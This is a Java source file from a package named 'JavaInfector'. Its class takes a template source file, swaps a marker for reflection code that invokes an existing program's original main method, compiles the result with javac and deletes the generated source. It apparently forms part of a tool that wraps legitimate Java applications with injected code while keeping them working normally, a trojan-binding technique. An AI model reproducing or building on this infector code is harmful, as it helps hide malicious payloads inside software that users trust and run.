package jlxip.JavaInfector;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.regex.Pattern;

public class CreateNewMainClass {
	Pattern slatch_pattern = Pattern.compile(Pattern.quote(File.separator));
	Pattern dot_pattern = Pattern.compile(Pattern.quote("."));
	
	public CreateNewMainClass(File INTERNALMC, File TEMPLATE, File NEWCLASS) {
		System.out.print("Creating new main class using template...");
		try{
			// READ AND MODIFY TEMPLATE "ON THE FLY"
			FileReader frTEMPLATE = new FileReader(TEMPLATE);
			BufferedReader brTEMPLATE = new BufferedReader(frTEMPLATE);
			ArrayList<String> lines = new ArrayList<String>();
			String lastLine;
			while((lastLine = brTEMPLATE.readLine()) != null) {
				Pattern del_pattern = Pattern.compile(Pattern.quote("/* --- TEMPLATE --- */"));
				if(del_pattern.split(lastLine+" ").length > 1) {
					lines.add("try{");
					lines.add("  Class TEMPLATEclass = Class.forName(\""+INTERNALMC+"\");");
					lines.add("  Object TEMPLATEobj = TEMPLATEclass.newInstance();");
					lines.add("  java.lang.reflect.Method TEMPLATEmethod = TEMPLATEclass.getMethod(\"main\", String[].class);");
					lines.add("  TEMPLATEmethod.invoke(TEMPLATEobj, new Object[]{args});");
					lines.add("}catch(Exception e){");
					lines.add("  System.out.println(e.toString());");	// !
					lines.add("}");
				} else {
					lines.add(lastLine);
				}
			}
			brTEMPLATE.close();
			frTEMPLATE.close();
			
			// WRITE THE MODIFIED TEMPLATE
			FileWriter FWmodifiedTEMPLATE = new FileWriter(NEWCLASS);
			PrintWriter PWmodifiedTEMPLATE = new PrintWriter(FWmodifiedTEMPLATE);
			for(int i=0;i<lines.size();i++) {
				PWmodifiedTEMPLATE.println(lines.get(i));
			}
			PWmodifiedTEMPLATE.close();
			FWmodifiedTEMPLATE.close();
			
			// COMPILE TEMPLATE
			String[] compile = {"javac", NEWCLASS.getAbsolutePath()};
			Process p = new ProcessBuilder(compile).start();
			try {
				p.waitFor();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			
			Boolean deleteResult = NEWCLASS.delete();
			if(deleteResult) {
				System.out.println("Done!");
			} else {
				System.out.println("FAILED!");
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
